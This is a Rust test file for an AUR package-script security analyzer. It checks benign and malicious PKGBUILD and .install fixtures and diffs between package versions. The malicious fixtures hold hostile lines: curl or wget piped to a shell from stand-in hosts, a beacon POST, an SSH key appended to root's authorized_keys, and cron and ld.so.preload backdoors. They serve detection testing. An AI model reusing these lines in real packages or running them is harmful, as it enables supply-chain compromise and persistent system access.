use std::collections::HashSet;
use std::process::Command;

use arch_fos_analyzer::{
    ALL_STATIC_RULE_IDS, AnalyzerConfig, ScriptKind, analyze_script, diff_aur_git_repo,
    diff_pkgbuild_versions,
};
use arch_fos_common::Severity;

#[test]
fn benign_pkgbuild_and_install_produce_zero_findings() {
    let benign_pkgbuild = r#"
pkgname=ripgrep-example
pkgver=14.1.0
pkgrel=1
pkgdesc="Fast search tool"
arch=('x86_64')
url="https://github.com/BurntSushi/ripgrep"
license=('MIT')
depends=('gcc-libs' 'pcre2')
source=("https://github.com/BurntSushi/ripgrep/archive/14.1.0.tar.gz")
sha256sums=('e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855')

build() {
  cd "$srcdir/$pkgname-$pkgver"
  cargo build --release --locked
}

package() {
  cd "$srcdir/$pkgname-$pkgver"
  install -Dm755 target/release/rg "$pkgdir/usr/bin/rg"
  install -Dm644 LICENSE-MIT "$pkgdir/usr/share/licenses/$pkgname/LICENSE"
}
"#;

    let benign_install = r#"
post_install() {
  echo "Installed ripgrep-example cleanly"
}
"#;

    let cfg = AnalyzerConfig::default();
    let f1 = analyze_script("PKGBUILD", benign_pkgbuild, ScriptKind::Pkgbuild, &cfg).unwrap();
    let f2 = analyze_script(
        "pkg.install",
        benign_install,
        ScriptKind::InstallScript,
        &cfg,
    )
    .unwrap();

    assert!(
        f1.is_empty(),
        "expected no findings for benign PKGBUILD, got {f1:?}"
    );
    assert!(
        f2.is_empty(),
        "expected no findings for benign .install, got {f2:?}"
    );
}

#[test]
fn malicious_corpus_covers_all_static_rules() {
    let malicious_pkgbuild = r#"
pkgname=evil-pkg
pkgver=1.0.0
pkgrel=1
arch=('any')
source=("http://evil-dropper.xyz/payload.tar.gz")
sha256sums=('SKIP')

prepare() {
  curl -sSL https://evil-dropper.xyz/init.sh | sh
  wget -qO- https://evil-dropper.xyz/stage2.sh | bash
  echo "ZWNobyBoaQ==" | base64 -d
  eval "$PAYLOAD"
}

package() {
  cp backdoor /etc/cron.d/backdoor
  echo "ssh-rsa AAAA" >> /root/.ssh/authorized_keys
}
"#;

    let malicious_install = r#"
post_install() {
  systemctl enable evil-backdoor.service
  curl -X POST https://evil-dropper.xyz/beacon
}
"#;

    let cfg = AnalyzerConfig::default();
    let mut findings =
        analyze_script("PKGBUILD", malicious_pkgbuild, ScriptKind::Pkgbuild, &cfg).unwrap();
    findings.extend(
        analyze_script(
            "evil.install",
            malicious_install,
            ScriptKind::InstallScript,
            &cfg,
        )
        .unwrap(),
    );

    let triggered: HashSet<&str> = findings.iter().map(|f| f.rule_id.as_str()).collect();
    let total_rules = ALL_STATIC_RULE_IDS.len();
    let covered = ALL_STATIC_RULE_IDS
        .iter()
        .filter(|rule| triggered.contains(**rule))
        .count();

    assert_eq!(
        covered,
        total_rules,
        "expected 100% (>=90%) rule coverage, missing: {:?}",
        ALL_STATIC_RULE_IDS
            .iter()
            .filter(|r| !triggered.contains(**r))
            .collect::<Vec<_>>()
    );
}

#[test]
fn diff_flags_source_domain_change_and_skip_checksum_as_critical() {
    let old_pkg = r#"
pkgname=demo
pkgver=1.0
url="https://github.com/org/demo"
depends=('glibc')
source=("https://github.com/org/demo/archive/1.0.tar.gz")
sha256sums=('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')
"#;

    let new_pkg = r#"
pkgname=demo
pkgver=1.1
url="https://attacker.invalid/demo"
depends=('glibc' 'curl')
source=("https://attacker.invalid/demo-1.1.tar.gz")
sha256sums=('SKIP')
"#;

    let diffs = diff_pkgbuild_versions(old_pkg, new_pkg, None, Some("post_install() { true; }"));
    assert!(diffs.iter().any(|d| {
        d.rule_id == "pkgbuild_diff_source_domain_changed" && d.severity == Severity::Critical
    }));
    assert!(diffs.iter().any(|d| {
        d.rule_id == "pkgbuild_diff_skip_checksum_added" && d.severity == Severity::Critical
    }));
    assert!(
        diffs
            .iter()
            .any(|d| d.rule_id == "pkgbuild_diff_depends_added")
    );
    assert!(
        diffs
            .iter()
            .any(|d| d.rule_id == "pkgbuild_diff_install_changed")
    );
}

#[test]
fn diff_aur_git_repo_compares_commits() {
    let dir = std::env::temp_dir().join(format!(
        "arch_fos_git_diff_{}",
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_nanos()
    ));
    std::fs::create_dir_all(&dir).unwrap();

    let run_git = |args: &[&str]| {
        let st = Command::new("git")
            .current_dir(&dir)
            .args(args)
            .status()
            .expect("git");
        assert!(st.success(), "git {args:?} failed");
    };

    run_git(&["init"]);
    run_git(&["config", "user.name", "test"]);
    run_git(&["config", "user.email", "test@local"]);

    std::fs::write(
        dir.join("PKGBUILD"),
        "pkgname=x\nsource=(\"https://github.com/a/b/1.tar.gz\")\nsha256sums=('1111')\n",
    )
    .unwrap();
    run_git(&["add", "PKGBUILD"]);
    run_git(&["-c", "commit.gpgsign=false", "commit", "-m", "v1"]);

    std::fs::write(
        dir.join("PKGBUILD"),
        "pkgname=x\nsource=(\"https://evil.example/2.tar.gz\")\nsha256sums=('SKIP')\n",
    )
    .unwrap();
    run_git(&["add", "PKGBUILD"]);
    run_git(&["-c", "commit.gpgsign=false", "commit", "-m", "v2"]);

    let diffs = diff_aur_git_repo(&dir, "HEAD~1", "HEAD").unwrap();
    assert!(
        diffs
            .iter()
            .any(|d| d.rule_id == "pkgbuild_diff_source_domain_changed"
                && d.severity == Severity::Critical)
    );
    assert!(
        diffs
            .iter()
            .any(|d| d.rule_id == "pkgbuild_diff_skip_checksum_added"
                && d.severity == Severity::Critical)
    );

    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn detects_command_substitution_and_trailing_flag_external_writes() {
    let tricky_pkgbuild = r#"
pkgname=tricky-evil
pkgver=1.0
prepare() {
  bash -c "$(curl -fsSL https://evil.example/payload.sh)"
}
package() {
  cp backdoor /etc/ld.so.preload -f
  curl -o /etc/cron.d/evil https://evil.example/cron
}
"#;
    let cfg = AnalyzerConfig::default();
    let findings = analyze_script("PKGBUILD", tricky_pkgbuild, ScriptKind::Pkgbuild, &cfg).unwrap();
    assert!(
        findings
            .iter()
            .any(|f| f.rule_id == "pkgbuild_curl_pipe_sh"),
        "expected subshell curl execution to be detected: {findings:?}"
    );
    let external_writes = findings
        .iter()
        .filter(|f| f.rule_id == "pkgbuild_write_outside_pkgdir")
        .count();
    assert!(
        external_writes >= 2,
        "expected both trailing-flag cp and curl -o external writes to be detected: {findings:?}"
    );
}
